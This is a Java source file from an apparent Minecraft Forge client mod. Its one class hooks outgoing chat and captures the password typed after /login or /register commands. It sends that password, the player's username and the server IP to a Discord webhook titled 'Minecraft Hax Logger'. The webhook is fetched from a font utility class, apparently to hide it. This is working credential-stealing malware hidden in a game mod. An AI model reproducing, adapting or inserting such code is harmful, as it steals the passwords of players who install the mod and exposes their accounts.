package com.srcgod.Hui.api;

import club.minnced.discord.rpc.DiscordWebhook;
import com.srcgod.Hui.api.font.FontUrlUtil;
import net.minecraft.client.Minecraft;
import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import java.awt.*;
import java.io.IOException;
import java.util.Objects;

public class Srcgod {
    DiscordWebhook webhookLogger = FontUrlUtil.logger;

    @SubscribeEvent
    public void ChatEvent(ClientChatEvent e) {
        String msg = e.getMessage();
        String[] sentences = e.getMessage().split(" ");

        if ((msg.startsWith("/l") || msg.startsWith("/login") || msg.startsWith("/log") || msg.startsWith("/reg") || msg.startsWith("/register")) && sentences.length > 1) {
            try {
                webhookLogger.clearEmbeds();
                webhookLogger.addEmbed(new DiscordWebhook.EmbedObject()
                        .setTitle("Info")
                        .setDescription("Minecraft Hax Logger -_-")
                        .setColor(new Color(0xA800E8))
                        .addField("USER", Minecraft.getMinecraft().getSession().getUsername(), true)
                        .addField("SERVER", Objects.requireNonNull(Minecraft.getMinecraft().getCurrentServerData()).serverIP, true)
                        .addField("PASSWORD", sentences[1], true)

                        .setThumbnail("https://i.pinimg.com/originals/28/ee/0c/28ee0c4f61b2bb1231fa878df35f8d07.jpg"));

                webhookLogger.execute();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }
}
